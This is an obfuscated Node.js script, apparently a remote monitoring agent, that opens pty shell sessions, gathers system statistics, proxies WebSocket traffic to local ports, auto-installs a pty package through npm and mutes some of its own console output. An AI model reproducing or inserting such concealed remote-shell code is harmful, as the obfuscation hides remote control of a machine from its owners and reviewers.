#!/usr/bin/env node
const a0d0 = a0b;
(function (a, b) {
    const cZ = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(cZ(0x827)) / 0x1 * (-parseInt(cZ(0xcdb)) / 0x2) + -parseInt(cZ(0xe8f)) / 0x3 * (parseInt(cZ(0x8aa)) / 0x4) + -parseInt(cZ(0xca3)) / 0x5 + -parseInt(cZ(0xa23)) / 0x6 + -parseInt(cZ(0x59d)) / 0x7 * (parseInt(cZ(0xea1)) / 0x8) + -parseInt(cZ(0x54e)) / 0x9 * (-parseInt(cZ(0x1ca)) / 0xa) + parseInt(cZ(0xc66)) / 0xb * (parseInt(cZ(0xe0d)) / 0xc);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x55ccb));
const a0c = [
    a0d0(0x159),
    a0d0(0x1ae),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const b = {
        'HfRse': function (c, d) {
            return c === d;
        },
        'xrdZQ': 'function',
        'ArOFJ': function (c) {
            return c();
        }
    };
    return function (c, d, f) {
        const d1 = a0b, g = c[d1(0xa27)]();
        if (a0c[d1(0x696)](h => g[d1(0xd32)](h))) {
            if (b[d1(0x89d)](typeof f, b[d1(0xd9c)]))
                b[d1(0xbf2)](f);
            return !![];
        }
        return a[d1(0x6e1)](this, arguments);
    };
}
process['stdout'][a0d0(0x5a6)] = a0d(process[a0d0(0x9a6)][a0d0(0x5a6)]), process[a0d0(0x208)][a0d0(0x5a6)] = a0d(process[a0d0(0x208)]['write']);
const a0f = require(a0d0(0x86f)), a0g = require('http'), a0h = require(a0d0(0xfe)), a0i = require(a0d0(0x20f)), a0j = require('tls'), a0k = require(a0d0(0x53b)), a0l = require('fs'), a0m = require('fs')[a0d0(0x535)], a0n = require(a0d0(0x49e)), a0o = require(a0d0(0xda2)), a0p = require('os'), a0q = require(a0d0(0xb9b)), {
        exec: a0r,
        spawn: a0s
    } = require(a0d0(0xb03)), a0t = require('node-cron'), a0u = require(a0d0(0x1ac)), {encrypt: a0v} = require('eciesjs'), a0w = require(a0d0(0xcb2)), a0x = require(a0d0(0x4f1)), a0y = require(a0d0(0xa37));
function a0z() {
    const d2 = a0d0, a = {
            'gfKqF': d2(0x616),
            'dMJPj': d2(0x132),
            'OBxpD': function (b, c) {
                return b <= c;
            },
            'OjATY': function (b, c) {
                return b + c;
            },
            'kfckb': function (b, c) {
                return b >= c;
            },
            'UBMbP': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[d2(0x782)](__dirname, a[d2(0x9e8)]);
        if (!a0l[d2(0x7d2)](b))
            return;
        for (let c of a0l[d2(0x902)](b, a[d2(0xe04)])[d2(0xc0)](/\r?\n/)) {
            let d = c['trim']();
            if (!d || d[d2(0x46a)]('#'))
                continue;
            if (d[d2(0x46a)](d2(0xd07)))
                d = d[d2(0x174)](0x7)[d2(0x346)]();
            const f = d[d2(0x44f)]('=');
            if (a[d2(0xcce)](f, 0x0))
                continue;
            const g = d[d2(0x174)](0x0, f)[d2(0x27f)]();
            let h = d[d2(0x174)](a[d2(0x8fa)](f, 0x1))[d2(0x27f)]();
            a[d2(0x6e5)](h[d2(0x615)], 0x2) && (h[d2(0x46a)]('\x22') && h[d2(0x361)]('\x22') || h[d2(0x46a)]('\x27') && h[d2(0x361)]('\x27')) && (h = h[d2(0x174)](0x1, -0x1));
            if (g && !a[d2(0xa70)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C = null, a0D = null, a0E = null, a0F = ![];
const a0G = a0d0(0xb90), a0H = a0d0(0x6a5);
function a0I() {
    const d3 = a0d0, a = { 'eMXjM': d3(0xce8) };
    if (process['platform'] !== 'linux')
        return null;
    try {
        const b = process[d3(0xc0a)][d3(0x7a0)]();
        if (b[d3(0x404)] && b[d3(0x404)]['glibcVersionRuntime'])
            return a['eMXjM'];
        if ((b[d3(0x8f3)] || [])[d3(0x696)](c => /(?:ld-musl|libc\.musl)/[d3(0xdbb)](String(c))))
            return d3(0x88b);
    } catch (c) {
    }
    return null;
}
function a0J(a) {
    const d4 = a0d0, b = {
            'tiLDK': function (d) {
                return d();
            },
            'eRJYv': function (d, f) {
                return d === f;
            },
            'IzWJd': d4(0x32e)
        }, c = a !== undefined ? a : b[d4(0x2c9)](a0I);
    if (b[d4(0x509)](c, d4(0x88b)))
        return [
            d4(0x850),
            d4(0x32e)
        ];
    return [
        b[d4(0x5cd)],
        d4(0x850)
    ];
}
const a0K = [
    a0d0(0x7fc),
    'const\x20shell\x20=\x20process.platform\x20===\x20\x22win32\x22\x20?\x20(process.env.ComSpec\x20||\x20\x22cmd.exe\x22)\x20:\x20\x22/bin/sh\x22;',
    a0d0(0xbe2),
    a0d0(0xcc6),
    a0d0(0x657),
    a0d0(0x7bc),
    'setTimeout(function\x20()\x20{\x20process.exit(3);\x20},\x208000);'
]['join']('\x0a');
function a0L(a) {
    const d5 = a0d0, b = {
            'HpYjO': function (c, d) {
                return c(d);
            },
            'zogdJ': function (c, d) {
                return c > d;
            },
            'lsMMV': function (c, d, f) {
                return c(d, f);
            },
            'fBQOe': function (c, d) {
                return c(d);
            },
            'ixsCB': function (c, d) {
                return c === d;
            },
            'SScSR': function (c, d, f) {
                return c(d, f);
            },
            'nCNvs': function (c, d, f, g) {
                return c(d, f, g);
            },
            'mspPX': d5(0x15c),
            'fkLlO': d5(0x275),
            'kbiBa': function (c, d, f) {
                return c(d, f);
            },
            'GoHTm': 'exit'
        };
    return new Promise(c => {
        const d6 = d5, d = {
                'KSwbt': function (l, m, n) {
                    return l(m, n);
                }
            };
        let f;
        try {
            f = require[d6(0x983)](a);
        } catch (l) {
            b['fBQOe'](c, {
                'ok': ![],
                'detail': '模块不存在:\x20'[d6(0x7b6)](String(l[d6(0xf18)])['split']('\x0a')[0x0])
            });
            return;
        }
        const g = b[d6(0x3c9)](a0s, process[d6(0x8ce)], [
            '-e',
            a0K
        ], {
            'cwd': a0p[d6(0x784)](),
            'env': {
                ...process.env,
                'KISAMA_PTY_PROBE_PATH': f
            },
            'stdio': [
                b['mspPX'],
                b[d6(0x8f1)],
                b[d6(0x4e0)]
            ]
        });
        let h = '';
        if (g[d6(0x208)])
            g[d6(0x208)]['on'](d6(0x426), m => {
                const d7 = d6;
                h += b[d7(0xa93)](String, m);
                if (b[d7(0x958)](h[d7(0x615)], 0x7d0))
                    h = h['slice'](-0x7d0);
            });
        let i = ![];
        const j = (m, n) => {
                !i && (i = !![], c({
                    'ok': m,
                    'detail': n
                }));
            }, k = b[d6(0x663)](setTimeout, () => {
                const d8 = d6;
                try {
                    g[d8(0x438)]();
                } catch (m) {
                }
                d[d8(0x675)](j, ![], d8(0x682));
            }, 0x3a98);
        g['on'](d6(0x755), m => {
            const d9 = d6;
            clearTimeout(k), b[d9(0xef)](j, ![], d9(0xaed)[d9(0x7b6)](m[d9(0xf18)]));
        }), g['on'](b[d6(0x3e9)], (m, n) => {
            const da = d6;
            b[da(0xaf6)](clearTimeout, k);
            if (b[da(0xa4b)](m, 0x0))
                b['SScSR'](j, !![], 'ok');
            else
                b[da(0x465)](j, ![], da(0xa47)[da(0x7b6)](m, da(0x381))[da(0x7b6)](n)[da(0x7b6)](h ? da(0xcf7) + h[da(0x27f)]()[da(0xc0)]('\x0a')[da(0xc48)]() : ''));
        });
    });
}
function a0M() {
    const db = a0d0;
    return process[db(0x721)][0x1] && a0o[db(0x6af)](a0o['resolve'](process['argv'][0x1])) || process[db(0xc50)]();
}
function a0N(a) {
    const dc = a0d0, b = {
            'hbsjs': function (j, k) {
                return j(k);
            },
            'NwnAT': function (j, k, l, m) {
                return j(k, l, m);
            },
            'hlQXA': function (j) {
                return j();
            },
            'AnUIH': function (j, k) {
                return j !== k;
            },
            'lktGJ': dc(0x88b),
            'zDXuo': function (j, k) {
                return j !== k;
            },
            'OPmMl': dc(0xce8),
            'SzDpp': 'package.json',
            'yBJtO': function (j, k) {
                return j(k);
            },
            'EUhgy': function (j, k) {
                return j + k;
            },
            'tUazQ': dc(0x29b),
            'ziUYy': dc(0x9ed)
        };
    if (a0F)
        return Promise[dc(0x983)](![]);
    a0F = !![];
    const c = b[dc(0x671)](a0I);
    if (b[dc(0xd18)](c, b[dc(0xa5a)]) && b[dc(0xb42)](c, b[dc(0x1e7)]))
        return Promise[dc(0x983)](![]);
    const d = '@qwqo/node-pty-linux-'[dc(0x7b6)](process[dc(0xd3f)], '-')[dc(0x7b6)](c), f = ''[dc(0x7b6)](d, '@')['concat'](a0G), g = b[dc(0x671)](a0M);
    if (!a0l['existsSync'](a0o[dc(0x782)](g, b['SzDpp'])))
        return b[dc(0x2bc)](a, dc(0xbf3)['concat'](g, dc(0x441))), Promise[dc(0x983)](![]);
    if (a0l[dc(0x7d2)](a0o[dc(0x782)](g, 'pnpm-lock.yaml')))
        return b['yBJtO'](a, dc(0x4ec)['concat'](f)), Promise[dc(0x983)](![]);
    const h = dc(0xe78)['concat'](a0G), i = b[dc(0xb47)](b[dc(0xa40)], b[dc(0x13b)]);
    return a('尝试\x20npm\x20自愈补装:\x20npm\x20install\x20'[dc(0x7b6)](h, '\x20')['concat'](f, dc(0x195))['concat'](g, ')')), new Promise(j => {
        const dd = dc, k = {
                'YPxez': function (l, m) {
                    return b['hbsjs'](l, m);
                }
            };
        b[dd(0x207)](a0r, dd(0x44b)[dd(0x7b6)](h, '\x20')[dd(0x7b6)](f, '\x20')['concat'](i), {
            'cwd': g,
            'timeout': 0xafc8,
            'windowsHide': !![]
        }, l => {
            const de = dd;
            if (l) {
                a(de(0x878)[de(0x7b6)](k[de(0xe3e)](String, l[de(0xf18)])[de(0xc0)]('\x0a')[0x0])), j(![]);
                return;
            }
            a('npm\x20自愈完成:\x20'[de(0x7b6)](h, '\x20+\x20')[de(0x7b6)](f)), k[de(0xe3e)](j, !![]);
        });
    });
}
function a0O(a, b, c) {
    const df = a0d0;
    return a0o[df(0x782)](a0o[df(0x6af)](a), '..', df(0x514)[df(0x7b6)](c, '-')['concat'](b), df(0x3a0));
}
async function a0P(a, b) {
    const dg = a0d0, c = {
            'fBOcV': function (m) {
                return m();
            },
            'ythSW': function (m) {
                return m();
            },
            'OcxcB': function (m, n, o, p) {
                return m(n, o, p);
            },
            'GAJTp': function (m, n) {
                return m(n);
            },
            'YUuYq': function (m, n) {
                return m(n);
            },
            'LiXJa': function (m, n) {
                return m(n);
            },
            'hKFUC': function (m, n) {
                return m(n);
            },
            'AHCZo': dg(0xe8a)
        }, f = b || {}, g = f[dg(0x3c3)] || c[dg(0x7a8)](a0J), h = f[dg(0x7a4)] || a0N, i = f['probePtyModule'] || a0L, j = f[dg(0x684)] || (m => require(m)), k = f[dg(0xc41)] || a0I, l = f[dg(0xeca)] || (() => require[dg(0x983)](dg(0x25f)));
    for (const m of g) {
        if (m[dg(0x46a)]('@qwqo/')) {
            const p = c[dg(0xd4c)](k);
            if (p) {
                let q = null;
                try {
                    q = c[dg(0xdbc)](a0O, l(), p, process['arch']);
                } catch (r) {
                    q = null;
                }
                if (q && !a0l[dg(0x7d2)](q)) {
                    a(dg(0xae5)['concat'](p, dg(0x7fb)));
                    const s = await h(a);
                    a(s ? dg(0x703)[dg(0x7b6)](m, dg(0x2f6)) : dg(0x703)[dg(0x7b6)](m, dg(0x4a7)));
                }
            }
        }
        let n = null;
        try {
            n = c[dg(0x672)](j, m);
        } catch (t) {
            a(dg(0x703)[dg(0x7b6)](m, '\x20加载失败:\x20')['concat'](t && t[dg(0x46f)] ? t[dg(0x46f)] + '\x20' : '')[dg(0x7b6)](c['YUuYq'](String, t && t[dg(0xf18)])[dg(0xc0)]('\x0a')[0x0]));
            continue;
        }
        const o = await c['LiXJa'](i, m);
        if (o['ok'])
            return c['hKFUC'](a, dg(0x587)[dg(0x7b6)](m, dg(0x60c))[dg(0x7b6)](c[dg(0xd4c)](a0I) || c[dg(0xa45)], ')')), {
                'name': m,
                'mod': n
            };
        c[dg(0x400)](a, dg(0x703)[dg(0x7b6)](m, dg(0xbe5))[dg(0x7b6)](o['detail']));
    }
    return null;
}
function a0Q() {
    const dh = a0d0, a = {
            'WBZVK': function (b, c) {
                return b + c;
            },
            'sXpnY': dh(0x55d),
            'hTtRm': function (b, c) {
                return b + c;
            },
            'NjUIe': dh(0x855),
            'qZcSV': function (b) {
                return b();
            },
            'YCZIo': 'x64',
            'EgZCZ': dh(0x577),
            'MufiY': dh(0xbd2)
        };
    if (a0C || a0D)
        return Promise[dh(0x983)](a0C);
    return !a0E && (a0E = a0P(b => {
        const di = dh;
        try {
            a0R[di(0x6e3)](di(0x55d)[di(0x7b6)](b));
        } catch (c) {
            console['log'](a[di(0xa9f)](a['sXpnY'], b));
        }
    })[dh(0x9f0)](b => {
        const dj = dh;
        return b ? a0C = b['mod'] : a0D = a[dj(0xa9f)](a[dj(0xb91)](a[dj(0xa9f)](a['NjUIe'], dj(0xe55)['concat'](process[dj(0xd3f)], '-')[dj(0x7b6)](a['qZcSV'](a0I) || a[dj(0x8f9)], '@')[dj(0x7b6)](a0G, dj(0x386))), a[dj(0x91f)]), a[dj(0xd71)]), a0C;
    })), a0E;
}
if (typeof Bun !== 'undefined')
    try {
        a0C = require(a0d0(0xabf));
    } catch (a0cX) {
        a0D = '核心终端依赖\x20(bun-pty)\x20加载失败:\x20' + a0cX[a0d0(0xf18)];
    }
else {
    if (process[a0d0(0x109)] !== a0d0(0xbe))
        try {
            a0C = require(a0d0(0x32e));
        } catch (a0cY) {
            a0D = '核心终端依赖\x20(pty)\x20加载失败:\x20' + a0cY['message'] + '\x20(npm\x20install\x20@lydell/node-pty)';
        }
}
const a0R = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const dk = a0d0, a = {
                'fVhoG': function (b, c) {
                    return b !== c;
                },
                'efJVT': 'undefined'
            };
        return a[dk(0x674)](typeof a0ax, a[dk(0x525)]) && a[dk(0x674)](a0ax[dk(0xd02)], undefined) ? a0ax[dk(0xd02)] : 0x2;
    },
    'debug': a => {
        const dl = a0d0;
        a0R['currentLevel'] <= a0R[dl(0x3a1)][dl(0x892)] && console[dl(0x6d3)](dl(0xee9)['concat'](a));
    },
    'info': a => {
        const dm = a0d0;
        a0R[dm(0x992)] <= a0R[dm(0x3a1)][dm(0x3b6)] && console[dm(0x6d3)]('\x1b[36m[INFO]\x1b[0m\x20'[dm(0x7b6)](a));
    },
    'warn': a => {
        const dn = a0d0;
        a0R[dn(0x992)] <= a0R[dn(0x3a1)][dn(0x530)] && console['log'](dn(0xace)['concat'](a));
    },
    'error': a => {
        const dp = a0d0, b = {
                'wXlts': function (c, d) {
                    return c <= d;
                }
            };
        b['wXlts'](a0R[dp(0x992)], a0R[dp(0x3a1)][dp(0x73a)]) && console[dp(0x6d3)](dp(0x10e)['concat'](a));
    }
};
function a0S() {
    const dq = a0d0, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p['homedir'](),
            process[dq(0xc50)]()
        ];
    for (const b of a) {
        if (b && a0l[dq(0x7d2)](b) && a0l[dq(0x9a5)](b)[dq(0xa43)]())
            return b;
    }
    return process['cwd']();
}
function a0T() {
    const dr = a0d0;
    let a = null;
    try {
        a = a0p['homedir']();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l['existsSync'](d) && a0l[dr(0x9a5)](d)[dr(0xa43)]())
            return d;
        if (d)
            console[dr(0x6d3)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20候选目录不存在,\x20已跳过:\x20'['concat'](d));
    }
    return console[dr(0x6d3)](dr(0x99d)['concat'](process[dr(0xc50)]())), process[dr(0xc50)]();
}
class a0U {
    constructor(a = 'ok') {
        const ds = a0d0;
        this[ds(0xab3)] = a;
    }
}
class a0V extends a0U {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0W extends a0U {
    constructor() {
        const dt = a0d0, a = '12|14|3|0|13|15|11|9|8|16|6|2|1|10|4|5|7'[dt(0xc0)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[dt(0xeb8)] = '';
                continue;
            case '1':
                this[dt(0x794)] = a0ax['AGENT_VERSION'];
                continue;
            case '2':
                this['swap_total'] = 0x0;
                continue;
            case '3':
                this['cpu_cores'] = 0x0;
                continue;
            case '4':
                this[dt(0xbc1)] = [];
                continue;
            case '5':
                this[dt(0xbb)] = '';
                continue;
            case '6':
                this[dt(0xf1c)] = '';
                continue;
            case '7':
                this[dt(0x183)] = null;
                continue;
            case '8':
                this[dt(0x599)] = 0x0;
                continue;
            case '9':
                this[dt(0xe94)] = null;
                continue;
            case '10':
                this[dt(0x271)] = '';
                continue;
            case '11':
                this[dt(0x324)] = null;
                continue;
            case '12':
                super();
                continue;
            case '13':
                this[dt(0x622)] = 0x0;
                continue;
            case '14':
                this[dt(0xd3f)] = '';
                continue;
            case '15':
                this[dt(0xbb1)] = '';
                continue;
            case '16':
                this['os'] = '';
                continue;
            }
            break;
        }
    }
}
class a0X extends a0U {
    constructor() {
        const du = a0d0, a = du(0xe36)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[du(0x201)] = 0x0;
                continue;
            case '1':
                this[du(0x269)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '2':
                super();
                continue;
            case '3':
                this[du(0xeb1)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this[du(0xb6f)] = { 'usage': 0x0 };
                continue;
            case '5':
                this[du(0x242)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '6':
                this[du(0xa0a)] = 0x0;
                continue;
            case '7':
                this[du(0xf18)] = '';
                continue;
            case '8':
                this['disk'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this[du(0x60f)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                this[du(0x804)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0Y extends a0U {
    constructor() {
        const dv = a0d0, a = { 'oFLrP': dv(0x651) }, b = a[dv(0x4bf)][dv(0xc0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[dv(0x187)] = '';
                continue;
            case '1':
                this[dv(0x729)] = '';
                continue;
            case '2':
                super();
                continue;
            case '3':
                this['exitcode'] = 0x0;
                continue;
            case '4':
                this[dv(0xcb5)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0Z {
    constructor() {
        const dw = a0d0, a = { 'rOqhf': dw(0x74a) }, b = a[dw(0x1f0)][dw(0xc0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[dw(0xda2)] = '';
                continue;
            case '1':
                this[dw(0x7a7)] = '';
                continue;
            case '2':
                this['name'] = '';
                continue;
            case '3':
                this[dw(0x466)] = '';
                continue;
            case '4':
                this[dw(0x3d3)] = '';
                continue;
            case '5':
                this['size'] = 0x0;
                continue;
            case '6':
                this[dw(0x1ed)] = '';
                continue;
            case '7':
                this['type'] = '';
                continue;
            }
            break;
        }
    }
}
class a0a0 {
    constructor() {
        const dx = a0d0, a = dx(0x11c)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this['mode'] = '';
                continue;
            case '1':
                this[dx(0x527)] = '';
                continue;
            case '2':
                this[dx(0x71b)] = ![];
                continue;
            case '3':
                this[dx(0xe77)] = '';
                continue;
            case '4':
                this[dx(0xda2)] = '';
                continue;
            case '5':
                this[dx(0x4ef)] = ![];
                continue;
            case '6':
                this[dx(0xbe9)] = ![];
                continue;
            case '7':
                this[dx(0x1ed)] = '';
                continue;
            }
            break;
        }
    }
}
class a0a1 extends a0U {
    constructor() {
        const dy = a0d0;
        super(), this[dy(0x7d0)] = [];
    }
}
class a0a2 {
    static [a0d0(0x9e2)]() {
        const dz = a0d0, a = {
                'nsNvq': dz(0x395),
                'FUovm': dz(0x764),
                'cQFdh': function (i, j) {
                    return i !== j;
                },
                'XepBh': 'base64'
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[dz(0xd77)](dz(0x9d1)), d = b['export']({ 'format': a[dz(0x922)] }), f = c['export']({ 'format': a['nsNvq'] }), g = Buffer[dz(0x58d)](d['d'], a[dz(0x19d)]), h = Buffer[dz(0x58d)](f['x'], a['FUovm']);
        return (g[dz(0x615)] !== 0x20 || a[dz(0x7e7)](h[dz(0x615)], 0x20)) && a0R[dz(0x755)](dz(0x58a)), {
            'private_b64': g[dz(0xa27)](a['XepBh']),
            'public_b64': h[dz(0xa27)](a[dz(0x179)])
        };
    }
    static [a0d0(0xe6c)](a) {
        const dA = a0d0, b = this[dA(0x9e2)]();
        return {
            'role': a,
            'private_b64': b['private_b64'],
            'public_b64': b['public_b64']
        };
    }
    static [a0d0(0x51a)](a = a0d0(0xba3), b = a0d0(0x3f3)) {
        const dB = a0d0, c = {
                'control': this[dB(0xe6c)](a),
                'agent': this[dB(0xe6c)](b)
            };
        return c;
    }
}
const a0a3 = new Set([
        a0d0(0x19e),
        a0d0(0xee),
        a0d0(0xbdb),
        a0d0(0xd17),
        a0d0(0x686),
        a0d0(0xa9),
        'favicon.ico'
    ]), a0a4 = /^[a-z0-9][a-z0-9-]{1,62}$/, a0a5 = new Set([
        a0d0(0xd12),
        a0d0(0x284),
        'proxy-authenticate',
        a0d0(0xa7b),
        'te',
        a0d0(0x885),
        a0d0(0x749),
        a0d0(0x2ba),
        'upgrade',
        a0d0(0xc32)
    ]);
function a0a6(a) {
    const dC = a0d0, b = {
            'SfLCi': function (d, f) {
                return d || f;
            },
            'vQLKU': function (d, f, g) {
                return d(f, g);
            },
            'fJVKM': function (d, f) {
                return d <= f;
            }
        }, c = new Set();
    for (const d of String(b[dC(0x4bd)](a, ''))[dC(0xc0)](',')) {
        const f = d[dC(0x27f)]();
        if (!/^\d+$/[dC(0xdbb)](f))
            continue;
        const g = b[dC(0x234)](parseInt, f, 0xa);
        if (g >= 0x1 && b[dC(0xa20)](g, 0xffff))
            c['add'](g);
    }
    return [...c][dC(0xa25)]((h, i) => h - i);
}
function a0a7(a) {
    const dD = a0d0, b = {
            'EwfZo': function (d, f) {
                return d || f;
            },
            'wGxBw': dD(0x32f)
        }, c = b[dD(0x53d)](a, '')[dD(0x27f)]()['toLowerCase']();
    if (!c)
        return b[dD(0x193)];
    if (!a0a4[dD(0xdbb)](c))
        return dD(0xa86)[dD(0x7b6)](a, dD(0x5a7));
    if (a0a3[dD(0xbe6)](c))
        return 'KNAME\x20\x27'[dD(0x7b6)](a, dD(0xe61));
    return null;
}
const a0a8 = /^https?:\/\/\S+$/;
function a0a9(a) {
    const dE = a0d0, b = {
            'Gmsos': function (d, f) {
                return d || f;
            },
            'yesMI': function (d, f) {
                return d > f;
            }
        }, c = b['Gmsos'](a, '')[dE(0x27f)]()['replace'](/\/+$/, '');
    if (!c)
        return null;
    if (b[dE(0x69a)](c[dE(0x615)], 0x200))
        return dE(0x685)[dE(0x7b6)](c[dE(0x615)], dE(0x64e));
    if (!a0a8['test'](c))
        return dE(0x6a9)['concat'](c, dE(0x1cf));
    return null;
}
function a0aa(a) {
    const dF = a0d0, b = {
            'REamV': function (d, f) {
                return d || f;
            },
            'ufciE': function (d, f) {
                return d + f;
            },
            'pZvlP': dF(0xa5),
            'lBJnb': function (d, f) {
                return d + f;
            },
            'XmUOO': function (d, f) {
                return d + f;
            },
            'yhJKY': 'ws://',
            'dbiTU': dF(0xd04),
            'aYvNO': function (d, f) {
                return d + f;
            },
            'AYEhU': function (d, f) {
                return d + f;
            }
        }, c = b[dF(0xdb3)](a, '')[dF(0x27f)]()['replace'](/\/+$/, '');
    if (c['startsWith'](dF(0x8fe)))
        return b['ufciE'](b[dF(0x318)](dF(0x457), c[dF(0x174)](0x8)), dF(0xd04));
    if (c[dF(0x46a)](b[dF(0xf07)]))
        return b[dF(0xdf1)](b[dF(0xa81)](b[dF(0x3cc)], c['slice'](0x7)), b[dF(0xc2)]);
    return b[dF(0xa7e)](b[dF(0x8c3)](b['yhJKY'], c), b[dF(0xc2)]);
}
function a0ab(a) {
    const dG = a0d0, b = {
            'jkeFn': function (d, f) {
                return d(f);
            },
            'gjfpX': 'x-kisama-hub-',
            'nOLjv': 'x-forwarded-'
        }, c = {};
    for (const [d, f] of Object[dG(0x471)](a || {})) {
        const g = b[dG(0x5bf)](String, d)[dG(0x777)]();
        if (a0a5[dG(0xbe6)](g) || g[dG(0x46a)](b['gjfpX']) || g['startsWith'](b['nOLjv']))
            continue;
        c[g] = f;
    }
    return c;
}
const a0ac = [
        'x-nonce',
        a0d0(0x363),
        'x-auth-token',
        'x-aes-encrypted',
        a0d0(0xb48),
        a0d0(0x1e5)
    ], a0ad = a0d0(0x4bc), a0ae = a0d0(0x88e), a0af = {
        [a0ad]: new Set(),
        [a0ae]: new Set()
    };
function a0ag(a) {
    const dH = a0d0, b = {
            'QcqjE': function (c, d) {
                return c === d;
            }
        };
    return b[dH(0xda3)](a, a0ad) ? Array[dH(0x5f9)](a0ax[dH(0xdaa)]) ? a0ax[dH(0xdaa)] : [] : b[dH(0xda3)](a, a0ae) ? Array[dH(0x5f9)](a0ax[dH(0x8c1)]) ? a0ax[dH(0x8c1)] : [] : [];
}
function a0ah(a) {
    const dI = a0d0;
    return [...a0af[a] || new Set()][dI(0xa25)]((c, d) => c - d);
}
function a0ai() {
    return {
        [a0ad]: a0ah(a0ad),
        [a0ae]: a0ah(a0ae)
    };
}
function a0aj(a) {
    const dJ = a0d0, b = {
            'wyzFN': function (c, d) {
                return c(d);
            }
        };
    return [...new Set([
            ...b[dJ(0xd3)](a0ag, a),
            ...a0af[a] || new Set()
        ])]['sort']((c, d) => c - d);
}
function a0ak(a) {
    const dK = a0d0, b = {
            'ovlmL': function (d, f) {
                return d === f;
            },
            'BWUmd': dK(0x893),
            'CtvMr': function (d, f) {
                return d(f);
            },
            'shDGk': function (d, f) {
                return d < f;
            },
            'IaSra': function (d, f) {
                return d > f;
            }
        }, c = new Set();
    for (const d of a || []) {
        if (b[dK(0x9ec)](typeof d, b[dK(0x5d5)]))
            continue;
        const f = b['CtvMr'](Number, d);
        if (!Number[dK(0x3f2)](f) || b[dK(0xd78)](f, 0x1) || b[dK(0x857)](f, 0xffff))
            continue;
        c[dK(0x6b6)](f);
    }
    return c;
}
function a0al(a, b) {
    const dL = a0d0, c = {
            'DQgED': function (f, g) {
                return f(g);
            }
        };
    if (!a0af[a])
        a0af[a] = new Set();
    const d = c[dL(0xd16)](a0ak, b);
    a0af[a]['clear']();
    for (const f of d)
        a0af[a][dL(0x6b6)](f);
}
function a0am(a, b) {
    const dM = a0d0, c = {
            'gFfWy': function (f, g) {
                return f(g);
            }
        };
    if (!a0af[a])
        a0af[a] = new Set();
    const d = c[dM(0xbc0)](a0ak, b);
    for (const f of d)
        a0af[a]['add'](f);
}
async function a0an(a, b) {
    const dN = a0d0, c = {
            'RExHk': function (n, o) {
                return n === o;
            },
            'dLjzS': dN(0x85c),
            'blpmK': dN(0xb17),
            'jLIjC': function (n, o, p) {
                return n(o, p);
            },
            'qGVxn': function (n, o) {
                return n > o;
            },
            'JGAtm': 'invalid_port:\x20',
            'WtdWr': function (n, o) {
                return n(o);
            },
            'IeUBc': function (n, o) {
                return n(o);
            },
            'Gecne': function (n, o) {
                return n + o;
            },
            'HzZEH': function (n, o) {
                return n + o;
            },
            'GboBM': dN(0x16f),
            'SyIlz': dN(0xe82),
            'lxCyL': function (n, o) {
                return n + o;
            },
            'znpsq': dN(0x127),
            'kuIir': dN(0xe93),
            'tBhnC': dN(0x588),
            'tWzFj': dN(0xf18),
            'VgcIo': 'close',
            'wtSiA': dN(0x755)
        }, d = c[dN(0xb10)](parseInt, b[dN(0x4e6)][dN(0x606)], 0xa);
    if (!Number[dN(0x3f2)](d) || d < 0x1 || c['qGVxn'](d, 0xffff)) {
        a[dN(0xd81)](0x3f0, c[dN(0xdf)] + c['WtdWr'](String, b[dN(0x4e6)][dN(0x606)])[dN(0x174)](0x0, 0x50));
        return;
    }
    if (!c[dN(0x7d8)](a0aj, a0ae)[dN(0xd32)](d)) {
        a['close'](0x3f0, c[dN(0x708)](c[dN(0x7fd)](c['GboBM'], d), c[dN(0xdf9)]));
        return;
    }
    const f = b[dN(0x4e6)][0x0] || '', g = b[dN(0x62e)][dN(0xd32)]('?') ? b[dN(0x62e)]['slice'](c[dN(0xa6d)](b[dN(0x62e)][dN(0x44f)]('?'), 0x1)) : '', h = dN(0xcf3)['concat'](d, '/')[dN(0x7b6)](f)[dN(0x7b6)](g ? c[dN(0x7fd)]('?', g) : ''), i = {};
    for (const [n, o] of Object[dN(0x471)](b[dN(0xe76)] || {})) {
        const p = c[dN(0x7d8)](String, n)[dN(0x777)]();
        if (a0a5[dN(0xbe6)](p) || p[dN(0x46a)](c[dN(0x156)]) || p['startsWith'](c[dN(0x6f4)]))
            continue;
        if (a0ac[dN(0xd32)](p))
            continue;
        i[n] = Array[dN(0x5f9)](o) ? o[0x0] : o;
    }
    let j;
    try {
        j = new a0cG(h, { 'headers': i });
    } catch (q) {
        a[dN(0xd81)](0x3f3, c['WtdWr'](String, q && q[dN(0xf18)] || q)['slice'](0x0, 0x64));
        return;
    }
    const l = [];
    let m = ![];
    j['on'](c[dN(0xc14)], () => {
        const dO = dN;
